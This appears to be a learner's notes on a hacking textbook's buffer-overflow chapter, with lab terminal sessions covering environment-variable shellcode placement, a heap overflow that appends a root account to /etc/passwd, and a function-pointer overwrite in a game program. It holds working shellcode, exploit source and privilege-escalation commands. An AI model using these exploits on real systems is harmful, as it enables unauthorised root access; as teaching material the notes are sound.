+reader@hacking:~/booksrc $ ./a.out SLEDLESS
+SLEDLESS is at 0xbfffff46
+reader@hacking:~/booksrc $ gdb -q
+(gdb) p 0xbfffff4e - 0xbfffff46
+$1 = 8
+(gdb) quit
+reader@hacking:~/booksrc $
+
+General trend seems to be a decrease of two bytes in the address of th environment variable for every single-byte increase in the length of the program name. 
+
+This holds tru with the program name a.out, since the difference in length between the names a.out and a is 4 bytes. The difference between the address 0xbfffff4e and 0xbfffff46 is eight bytes. 
+
+Must mean the name of the executing program is also located o nthe stack, causing the shifting.
+
+Armed with this knowledge, the exact address of the environment variable can be predicted when the vulnerable program is executed. 
+
+Means a NOP sled can be eliminated.
+
+getenvaddr.c
+
+Adjusts address based on difference in program name length to provide an accurate prediction
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main(int argc, char *argv[]) {
+char *ptr;
+if(argc < 3) {
+printf("Usage: %s <environment var> <target program name>\n", argv[0]);
+exit(0);
+}
+ptr = getenv(argv[1]); /* Get env var location. */
+ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
+printf("%s will be at %p\n", argv[1], ptr);
+}
+
+When compiled, this program can accurately predict where an environment variable will be in memory during a target program's execution. 
+
+Can be used to exploit stack-based buffer overflows without the nede for a NOP sled
+
+reader@hacking:~/booksrc $ gcc -o getenvaddr getenvaddr.c
+reader@hacking:~/booksrc $ ./getenvaddr SLEDLESS ./notesearch
+SLEDLESS will be at 0xbfffff3c
+reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x3c\xff\xff\xbf"x40')
+[DEBUG] found a 34 byte note for user id 999
+[DEBUG] found a 41 byte note for user id 999
+
+Environment variables can be used to make exploit code more reliable.
+
+The system() function is used in the notesearch_exploit.c program to execute  a command. This function starts a new process and runs the command using /bin/sh -c. The -c tells sh program to execute commands from the command-line argument passed to it
+
+Can see search code for this in libc using google.
+
+int system(const char * cmd)
+{
+int ret, pid, waitstat;
+void (*sigint) (), (*sigquit) ();
+if ((pid = fork()) == 0) {
+execl("/bin/sh", "sh", "-c", cmd, NULL);
+exit(127);
+}
+if (pid < 0) return(127 << 8);
+sigint = signal(SIGINT, SIG_IGN);
+sigquit = signal(SIGQUIT, SIG_IGN);
+while ((waitstat = wait(&ret)) != pid && waitstat != -1);
+if (waitstat == -1) ret = -1;
+signal(SIGINT, sigint);
+signal(SIGQUIT, sigquit);
+return(ret);
+}
+
+fork() function starts a new process. The execl() function is used to run the command through /bin/sh with the appropriate command line arguments. 
+
+Use of system() can sometimes cause  problems. 
+
+if a setuid program uses system(), the priveleges won't be transferred. Also exploit doesn't really need to be starting a new process. 
+
+execl() function belongs to a family of functions that execute commands by replacing the current process with a new one. Arguments for execl() start with the path to the target program and are folloewd by each of the command line arguments. Second function argument is actually the 0th command line argument, which is the name of the program. Last argument is a NULL to terminate the argument list. 
+
+execle() -> one additional argument to specify the environment under which the executing process should run. This environment is presented in the form of an array of pointers to null-terminated strings for each environment variable, and the environment array itself is terminated with a NULL pointer.
+
+With execl(), the existing environment is used, but if you use execle(), the entire environment can be specified. 
+
+If the environment array is just the shellcode as the first string (with a NULL pointer to terminate the list), the only environment variable will be the shell code.
+
+This makes its address easy to calculate. 
+
+In Linux, the address will be 0xbffffffa , minus the length of the shellcode in the environment, minus the length of the name of the executed program
+
+No need for a NOP sled. 
+
+exploit_notesearch_env.c
+
+#include
+#include
+#include
+#include
+<stdio.h>
+<stdlib.h>
+<string.h>
+<unistd.h>
+char shellcode[]=
+"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
+"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
+"\xe1\xcd\x80";
+int main(int argc, char *argv[]) {
+char *env[2] = {shellcode, 0};
+unsigned int i, ret;
+char *buffer = (char *) malloc(160);
+ret = 0xbffffffa - (sizeof(shellcode)-1) - strlen("./notesearch");
+for(i=0; i < 160; i+=4)
+*((unsigned int *)(buffer+i)) = ret;
+execle("./notesearch", "notesearch", buffer, 0, env);
+free(buffer);
+}
+
+This exploit does not need a NOP sled, any guesswork regarding offsets, or any additional processes.
+
+reader@hacking:~/booksrc $ gcc exploit_notesearch_env.c
+reader@hacking:~/booksrc $ ./a.out
+-------[ end of note data ]-------
+sh-3.2#
+
+OVERFLOWS IN OTHER SEGMENTS
+
+Buffer overflows can happen in other segments like the heap and bss. 
+
+May not be as standardized as stack based overflows
+
+BASIC HEAP BASED OVERFLOW
+
+notetaker.c is also susceptible to a buffer overflow.
+
+Two buffers are allocated on the heap, and the first command-line argument is copied into the firt buffer. 
+
+Overflow can occur here. 
+
+Under normal conditions, the buffer allocation is located at 0x804a008 , which is before the datafile allocation at 0x804a070 , as the debugging output shows. The distance between these two addresses is 104 bytes
+
+reader@hacking:~/booksrc $ ./notetaker test
+[DEBUG] buffer
+@ 0x804a008: 'test'
+[DEBUG] datafile @ 0x804a070: '/var/notes'
+[DEBUG] file descriptor is 3
+Note has been saved.
+reader@hacking:~/booksrc $ gdb -q
+(gdb) p 0x804a070 - 0x804a008
+$1 = 104
+(gdb) quit
+reader@hacking:~/booksrc $
+
+Since the first buffer is null terminated, the maximum amount of data that can be put into this buffer without overflowing into the next should be 104 bytes.
+
+der@hacking:~/booksrc $ ./notetaker $(perl -e 'print "A"x104')
+[DEBUG] buffer @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+[DEBUG] datafile @ 0x804a070: ''
+[!!] Fatal Error in main() while opening file: No such file or directory
+reader@hacking:~/booksrc $
+
+When 104 bytes are tried, the null-termination byte overflows into beginning of datafile buffer. Causes the datafile to be nothing but a single null bye, which cannot be opened as a file. 
+
+But what if datafile buffer is overwritten with something more?
+
+reader@hacking:~/booksrc $ ./notetaker $(perl -e 'print "A"x104 . "testfile"')
+[DEBUG] buffer @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestfile'
+[DEBUG] datafile @ 0x804a070: 'testfile'
+[DEBUG] file descriptor is 3
+Note has been saved.
+*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***
+======= Backtrace: =========
+/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]
+/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]
+./notetaker[0x8048916]
+/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]
+./notetaker[0x8048511]
+======= Memory map: ========
+08048000-08049000 r-xp 00000000 00:0f 44384
+/cow/home/reader/booksrc/notetaker
+08049000-0804a000 rw-p 00000000 00:0f 44384
+/cow/home/reader/booksrc/notetaker
+0804a000-0806b000 rw-p 0804a000 00:00 0
+[heap]
+b7d00000-b7d21000 rw-p b7d00000 00:00 0
+b7d21000-b7e00000 ---p b7d21000 00:00 0
+b7e83000-b7e8e000 r-xp 00000000 07:00 15444
+/rofs/lib/libgcc_s.so.1
+b7e8e000-b7e8f000 rw-p 0000a000 07:00 15444
+/rofs/lib/libgcc_s.so.1
+b7e99000-b7e9a000 rw-p b7e99000
+b7e9a000-b7fd5000 r-xp 00000000
+b7fd5000-b7fd6000 r--p 0013b000
+b7fd6000-b7fd8000 rw-p 0013c000
+b7fd8000-b7fdb000 rw-p b7fd8000
+b7fe4000-b7fe7000 rw-p b7fe4000
+b7fe7000-b8000000 r-xp 00000000
+b8000000-b8002000 rw-p 00019000
+bffeb000-c0000000 rw-p bffeb000
+ffffe000-fffff000 r-xp 00000000
+Aborted
+reader@hacking:~/booksrc $
+
+This time, overflow is designed to overwrite the datafile buffer with the string testfile. 
+
+Causes the program to write to testfile instead of /var/notes. However, when the heap memory is freed by free(), errors in the heap headers are detected and the proram is terminated. 
+
+Similar to return address overwrite with stack overflows, there are control points within the heap architecture itself. 
+
+Version of glibc in this book uses heap memory management functions that have evolved specifically to counter heap unlinking attacks. Since 2.2.5, these functions have been reqritten to print debugging information and terminate the program when they detectt problems with the heap header information. Makes heap unlinking in Llinux very difficult. 
+
+However, this program doesn't use heap header information to do its magic, so by the time the free() is called, the program has already been tricked into writing to a new file iwth root privileges. 
+
+A string is read until a null byte is encountered, so the entire string is written to the file as the userinput . Since this is a suid root program, the file that is created is owned by root. This also means that since the filename can be controlled, data can be appended to any file. This data does have some restrictions, though; it must end with the controlled filename, and a line with the user ID will be written, also.
+
+Probably several ways to exploit this type of capability. 
+
+Most apparent one would be to append something to /etc/passwd file. File contains all the usernames, ID,s and login shells for all the users of the system. 
+
+Good to backup system critical files
+
+reader@hacking:~/booksrc $ cp /etc/passwd /tmp/passwd.bkup
+reader@hacking:~/booksrc $ head /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+reader@hacking:~/booksrc $
+
+Fields in passwd file are delimited by colons, the first field being for login name, then password, user ID, group ID, username, home directory, and finally the login shell. 
+
+The password fields are all filled with the x character, since the encrypted passwords are stored elsewhere ina shadow file. (However, this field can contain the encrypted password.)
+
+In additiona, any entry in the apssword file that has a user ID of 0 will be given root privilieges. 
+
+That means the goal is to append an extra entry with both root privileges and a known password to the password file. 
+
+Pasword can be encrypted using a one-way hashing algorithm. 
+
+Because the algorithm is one way, the original password cannot be recreated from the hash value. To prevent lookup attacks, the algorithm uses a *salt value*, which when varied creates a different hash value for the same input password. 
+
+Perl has crypt() function that performs this operation. First argument is the password, and second is the salt value. 
+
+Same password with a different salt produces a different hash. 
+
+reader@hacking:~/booksrc $ perl -e 'print crypt("password", "AA"). "\n"'
+AA6tQYSfGxd/A
+reader@hacking:~/booksrc $ perl -e 'print crypt("password", "XX"). "\n"'
+XXq2wKiyI43A2
+reader@hacking:~/booksrc $
+
+Notice salt value is always at the beginning of the hash. 
+
+When user logs in and enters a password, the system looks up the encrypted password for that user. Using the salt value from the stored encrypted apssword, the system uses the same one-way hasing algorithm to encrypt whatever text the user typed as the password. 
+
+Finally, the system compares the two hashes: if they are the same, the user must have entered the correct password. This allows the password to be used for authentication without requiring that the password be stored anywhere on the system.
+
+Using one of these hashes in the apssword field will make the password for the account be password, regardless of the salt value used. 
+
+Should append this line to /etc/passwd
+
+myroot:XXq2wKiyI43A2:0:0:me:/root:/bin/bash
+
+However, the nature of this particular heap overflow exploit won't allow that exact line to be written t /etc/passwd because the string must end with /etc/passwd. 
+
+But if that filename is appended to end of the entry the passwd file entry would be incorrect. 
+
+This can be compensated for with a clever use of a symbolic file link, so the entry can both end with /etc/passwd and still be a valid line in the password file
+
+reader@hacking:~/booksrc $ mkdir /tmp/etc
+reader@hacking:~/booksrc $ ln -s /bin/bash /tmp/etc/passwd
+reader@hacking:~/booksrc $ ls -l /tmp/etc/passwd
+lrwxrwxrwx 1 reader reader 9 2007-09-09 16:25 /tmp/etc/passwd -> /bin/bash
+reader@hacking:~/booksrc $
+
+Now /tmp/etc/passwd points to the login shell /bin/bashNow /tmp/etc/passwd points to the login shell /bin/bash. . Means that a valid login shell for the password file is also /tmp/etc/passwd, making the following a valid password file line:
+
+myroot:XXq2wKiyI43A2:0:0:me:/root:/tmp/etc/passwd
+
+Values of this line just need to be slightly modified so that the portion before /etc/passwd is exactly 104 bytes long:
+
+reader@hacking:~/booksrc $ perl -e 'print "myroot:XXq2wKiyI43A2:0:0:me:/root:/tmp"' | wc -c
+38
+reader@hacking:~/booksrc $ perl -e 'print "myroot:XXq2wKiyI43A2:0:0:" . "A"x50 . ":/root:/tmp"'
+| wc -c
+86
+reader@hacking:~/booksrc $ gdb -q
+(gdb) p 104 - 86 + 50
+$1 = 68
+(gdb) quit
+reader@hacking:~/booksrc $ perl -e 'print "myroot:XXq2wKiyI43A2:0:0:" . "A"x68 . ":/root:/tmp"'
+| wc -c
+104
+reader@hacking:~/booksrc $
+
+If /etc/passwd is added to end of last command, the string above will be appended to the end of the /etc/passwd file. And since this line defines an account with root privileges with a password we set, it won't be difficult to acess this account and obtain root access, as the following output shows
+
+reader@hacking:~/booksrc $ ./notetaker $(perl -e 'print "myroot:XXq2wKiyI43A2:0:0:" . "A"x68 .
+":/root:/tmp/etc/passwd"')
+[DEBUG] buffer
+@ 0x804a008: 'myroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd'
+[DEBUG] datafile @ 0x804a070: '/etc/passwd'
+[DEBUG] file descriptor is 3
+Note has been saved.
+*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***
+======= Backtrace: =========
+/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]
+/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]
+./notetaker[0x8048916]
+/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]
+./notetaker[0x8048511]
+======= Memory map: ========
+08048000-08049000 r-xp 00000000 00:0f 44384
+/cow/home/reader/booksrc/notetaker
+08049000-0804a000 rw-p 00000000 00:0f 44384
+/cow/home/reader/booksrc/notetaker
+0804a000-0806b000 rw-p 0804a000 00:00 0
+[heap]
+b7d00000-b7d21000 rw-p b7d00000 00:00 0
+b7d21000-b7e00000 ---p b7d21000 00:00 0
+b7e83000-b7e8e000 r-xp 00000000 07:00 15444
+/rofs/lib/libgcc_s.so.1
+b7e8e000-b7e8f000 rw-p 0000a000 07:00 15444
+/rofs/lib/libgcc_s.so.1
+b7e99000-b7e9a000 rw-p b7e99000 00:00 0
+b7e9a000-b7fd5000 r-xp 00000000 07:00 15795
+/rofs/lib/tls/i686/cmov/libc-2.5.so
+b7fd5000-b7fd6000 r--p 0013b000 07:00 15795
+/rofs/lib/tls/i686/cmov/libc-2.5.so
+b7fd6000-b7fd8000 rw-p 0013c000 07:00 15795
+/rofs/lib/tls/i686/cmov/libc-2.5.so
+b7fd8000-b7fdb000 rw-p b7fd8000 00:00 0
+b7fe4000-b7fe7000 rw-p b7fe4000 00:00 0
+b7fe7000-b8000000 r-xp 00000000 07:00 15421
+/rofs/lib/ld-2.5.so
+b8000000-b8002000 rw-p 00019000 07:00 15421
+/rofs/lib/ld-2.5.so
+bffeb000-c0000000 rw-p bffeb000 00:00 0
+[stack]
+ffffe000-fffff000 r-xp 00000000 00:00 0
+[vdso]
+Aborted
+reader@hacking:~/booksrc $ tail /etc/passwd
+avahi:x:105:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+cupsys:x:106:113::/home/cupsys:/bin/false
+haldaemon:x:107:114:Hardware abstraction layer,,,:/home/haldaemon:/bin/false
+hplip:x:108:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+gdm:x:109:118:Gnome Display Manager:/var/lib/gdm:/bin/false
+matrix:x:500:500:User Acct:/home/matrix:/bin/bash
+jose:x:501:501:Jose Ronnick:/home/jose:/bin/bash
+reader:x:999:999:Hacker,,,:/home/reader:/bin/bash
+?
+myroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/
+root:/tmp/etc/passwd
+reader@hacking:~/booksrc $ su myroot
+Password:
+root@hacking:/home/reader/booksrc# whoami
+root
+root@hacking:/home/reader/booksrc#
+
+OVERFLOWING FUNCTION POINTERS
+
+If you have played the game_of_chance.c program enough, you will realize, that, similar to a casino, most of the games are statisticaly weighted in favor of the house. 
+
+Can write a program that uses a function pointer to remember the last game played. Pointer is stored in the user structure, which is declared as a global variable. Means all the memory for the user structure is allocated in the bss segment. 
+
+From game_of_chance.c
+
+// Custom user struct to store information about users
+struct user {
+int uid;
+int credits;
+int highscore;
+char name[100];
+int (*current_game) ();
+};
+...
+// Global variables
+struct user player;
+// Player struct
+
+The name buffer in the user structure is a likely place for an overflow. 
+
+Buffer is set by the input_name() function, shown below. 
+
+// This function is used to input the player name, since
+// scanf("%s", &whatever) will stop input at the first space.
+void input_name() {
+char *name_ptr, input_char='\n';
+while(input_char == '\n')
+// Flush any leftover
+scanf("%c", &input_char); // newline chars.
+name_ptr = (char *) &(player.name); // name_ptr = player name's address
+while(input_char != '\n') { // Loop until newline.
+*name_ptr = input_char;
+// Put the input char into name field.
+scanf("%c", &input_char); // Get the next char.
+name_ptr++;
+// Increment the name pointer.
+}
+*name_ptr = 0; // Terminate the string.
+}
+
+Function only stops inputting at a newline character. Nothing to limit it to the length of the destination name buffer, meaning an overflow is possible. 
+
+In order to take advantage of the overflow, we need to make the program call the function pointer after it is overwritten. This happens in the play_the_game() function, which is called when any game is selected from the menu. 
+
+Following snippet is part of the menu selection code, used for picking and playing a game. 
+
+if((choice < 1) || (choice > 7))
+printf("\n[!!] The number %d is an invalid selection.\n\n", choice);
+else if (choice < 4) { // Otherwise, choice was a game of some sort.
+if(choice != last_game) { // If the function ptr isn't set,
+if(choice == 1)
+// then point it at the selected game
+player.current_game = pick_a_number;
+else if(choice == 2)
+player.current_game = dealer_no_match;
+else
+player.current_game = find_the_ace;
+last_game = choice;
+// and set last_game.
+}
+play_the_game();
+// Play the game.
+}
+
+If last_game isn't the same as the current choice, the function pointer of current_game is changed to the appropriate game. Means that in order to get the program to call the function pointer without overwriting it, a game must be played first to set the last_game variable
+
+reader@hacking:~/booksrc $ ./game_of_chance
+-=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: Jon Erickson]
+[You have 70 credits] -> 1
+[DEBUG] current_game pointer @ 0x08048fde
+####### Pick a Number ######
+This game costs 10 credits to play. Simply pick a number
+between 1 and 20, and if you pick the winning number, you
+will win the jackpot of 100 credits!
+10 credits have been deducted from your account.
+Pick a number between 1 and 20: 5
+The winning number is 17
+Sorry, you didn't win.
+You now have 60 credits
+Would you like to play again? (y/n) n
+-=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: Jon Erickson]
+[You have 60 credits] ->
+[1]+ Stopped			./game_of_chance
+reader@hacking:~/booksrc $
+
+Can temporarily suspend current process by pressing ctrl-z
+
+At this point, the last_game variable has been set to 1, so next time 1 is selected, the function pointer will simply be callde without being changed. Back in the shell, we figure out an appropriate overflow buffer, which cam be copied and pasted in as a name later. 
+
+Recompiling the source with debugging symbols and using GDB to run the program with a breakpoint on main() allows us to explore the memory. 
+
+As output shows, the name buffer is 100 bytes from the current_game pointer within the user structure
+
+reader@hacking:~/booksrc $ gcc -g game_of_chance.c
+reader@hacking:~/booksrc $ gdb -q ./a.out
+Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+(gdb) break main
+Breakpoint 1 at 0x8048813: file game_of_chance.c, line 41.
+(gdb) run
+Starting program: /home/reader/booksrc/a.out
+Breakpoint 1, main () at game_of_chance.c:41
+41
+srand(time(0)); // Seed the randomizer with the current time.
+(gdb) p player
+$1 = {uid = 0, credits = 0, highscore = 0, name = '\0' <repeats 99 times>,
+current_game = 0}
+(gdb) x/x &player.name
+0x804b66c <player+12>: 0x00000000
+(gdb) x/x &player.current_game
+0x804b6d0 <player+112>: 0x00000000
+(gdb) p 0x804b6d0 - 0x804b66c
+$2 = 100
+(gdb) quit
+The program is running. Exit anyway? (y or n) y
+reader@hacking:~/booksrc $
+
+Using this information, can generate a buffer to overflow the name varible with. Can be copied and pasted into the interactive Game of Chance program when it is resumed. 
+
+fg -> to return to the suspended processes
+
+der@hacking:~/booksrc $ perl -e 'print "A"x100 . "BBBB" . "\n"'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAABBBB
+reader@hacking:~/booksrc $ fg
+./game_of_chance
+5
+Enter your new name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Your name has been changed.
+-=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB]
+[You have 60 credits] -> 1
+[DEBUG] current_game pointer @ 0x42424242
+Segmentation fault
+reader@hacking:~/booksrc $
+
+Select menu 5 to change the username, and paste in the overflow buffer. Will overwrite hte function pointer with 0x42424242. When menu option 1 is selected again, the program will crash when it tries to call the function pointer. 
+
+Proof that execution can be controlled. All that is needed is a valid address to insert in place of BBBB.
+
+nm -> command lists symbols in object files. Can be used to find addresses of various functions in a program.
+
+nm game_of_chance
+
+reader@hacking:~/booksrc $ nm game_of_chance
+0804b508 d _DYNAMIC
+0804b5d4 d _GLOBAL_OFFSET_TABLE_
+080496c4 R _IO_stdin_used
+w _Jv_RegisterClasses
+0804b4f8 d __CTOR_END__
+0804b4f4 d __CTOR_LIST__
+0804b500 d __DTOR_END__
+0804b4fc d __DTOR_LIST__
+0804a4f0 r __FRAME_END__
+0804b504 d __JCR_END__
+0804b504 d __JCR_LIST__
+0804b630 A __bss_start
+0804b624 D __data_start
+08049670 t __do_global_ctors_aux
+08048610 t __do_global_dtors_aux
+0804b628 D __dso_handle
+w __gmon_start__
+08049669 T __i686.get_pc_thunk.bx
+0804b4f4 d __init_array_end
+0804b4f4 d __init_array_start
+080495f0 T __libc_csu_fini
+08049600 T __libc_csu_init
+U __libc_start_main@@GLIBC_2.0
+0804b630
+0804b6d4
+080496a0
+080496c0
+08048484
+080485c0
+080485e4
+A _edata
+A _end
+T _fini
+R _fp_hw
+T _init
+T _start
+t call_gmon_start
+U close@@GLIBC_2.0
+0804b640 b completed.1
+0804b624 W data_start
+080490d1 T dealer_no_match
+080486fc T dump
+080486d1 T ec_malloc
+U exit@@GLIBC_2.0
+08048684 T fatal
+080492bf T find_the_ace
+08048650 t frame_dummy
+080489cc T get_player_data
+U getuid@@GLIBC_2.0
+08048d97 T input_name
+08048d70 T jackpot
+08048803 T main
+U malloc@@GLIBC_2.0
+U open@@GLIBC_2.0
+0804b62c d p.0
+U perror@@GLIBC_2.0
+08048fde T pick_a_number
+08048f23 T play_the_game
+0804b660 B player
+08048df8 T print_cards
+U printf@@GLIBC_2.0
+U rand@@GLIBC_2.0
+U read@@GLIBC_2.0
+08048aaf T register_new_player
+U scanf@@GLIBC_2.0
+08048c72 T show_highscore
+U srand@@GLIBC_2.0
+U strcpy@@GLIBC_2.0
+U strncat@@GLIBC_2.0
+08048e91 T take_wager
+U time@@GLIBC_2.0
+08048b72 T update_player_data
+U write@@GLIBC_2.0
+reader@hacking:~/booksrc $
+
+The jackpot() function is a wonderful target for this exploit. 
+
+Even though games give terrible odds, if the current_game function pointer is carefully overwritten with the address of the jackpot() function, you won't have to play the game to win credits. 
+
+Instead, jackpot() function will be called directly, doling out the reward of 100 credits. 
+
+Program takes its input from standard input. The menu selections can be scripted in a single buffer that is piped to the program's standard input. Selections will be made as it they were types. The following example will choose menu item 1, try to guess the numbre 7, select n when asked to play again, and finally select menu item 7 to quit. 
+
+reader@hacking:~/booksrc $ perl -e 'print "1\n7\nn\n7\n"' | ./game_of_chance
+-=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: Jon Erickson]
+[You have 60 credits] ->
+[DEBUG] current_game pointer @ 0x08048fde
+####### Pick a Number ######
+This game costs 10 credits to play. Simply pick a number
+between 1 and 20, and if you pick the winning number, you
+will win the jackpot of 100 credits!
+10 credits have been deducted from your account.
+Pick a number between 1 and 20: The winning number is 20
+Sorry, you didn't win.
+You now have 50 credits
+Would you like to play again? (y/n) -=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: Jon Erickson]
+[You have 50 credits] ->
+Thanks for playing! Bye.
+reader@hacking:~/booksrc $
+
+Same technique can be used to script everything needed for the xploit.
+
+Following ine will play the Pick a Number game once, then change the username to 100 A's followed by the address of the jackpot() function. This will overflow the current_game function pointer so when the Pick A Number game is played again, the jackpot() function is called directy. 
+
+reader@hacking:~/booksrc $ perl -e 'print "1\n5\nn\n5\n" . "A"x100 . "\x70\
+x8d\x04\x08\n" . "1\nn\n" . "7\n"'
+1
+5
+n
+5
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAp?
+1
+n
+7
+reader@hacking:~/booksrc $ perl -e 'print "1\n5\nn\n5\n" . "A"x100 . "\x70\
+x8d\x04\x08\n" . "1\nn\n" . "7\n"' | ./game_of_chance
+-=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: Jon Erickson]
+[You have 50 credits] ->
+[DEBUG] current_game pointer @ 0x08048fde
+####### Pick a Number ######
+This game costs 10 credits to play. Simply pick a number
+between 1 and 20, and if you pick the winning number, you
+will win the jackpot of 100 credits!
+10 credits have been deducted from your account.
+Pick a number between 1 and 20: The winning number is 15
+Sorry, you didn't win.
+You now have 40 credits
+Would you like to play again? (y/n) -=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: Jon Erickson]
+[You have 40 credits] ->
+Change user name
+Enter your new name: Your name has been changed.
+-=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
+[You have 40 credits] ->
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 140 credits
+Would you like to play again? (y/n) -=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
+[You have 140 credits] ->
+Thanks for playing! Bye.
+reader@hacking:~/booksrc $
+
+********************************
+
+After confirming this method works, can be expanded upon to gain any number of credits
+
+*******************************
+
+reader@hacking:~/booksrc $ perl -e 'print "1\n5\nn\n5\n" . "A"x100 . "\x70\
+x8d\x04\x08\n" . "1\n" . "y\n"x10 . "n\n5\nJon Erickson\n7\n"' | ./
+game_of_chance
+-=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
+[You have 140 credits] ->
+[DEBUG] current_game pointer @ 0x08048fde
+####### Pick a Number ######
+This game costs 10 credits to play. Simply pick a number
+between 1 and 20, and if you pick the winning number, you
+will win the jackpot of 100 credits!
+10 credits have been deducted from your account.
+Pick a number between 1 and 20: The winning number is 1
+Sorry, you didn't win.
+You now have 130 credits
+Would you like to play again? (y/n)
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
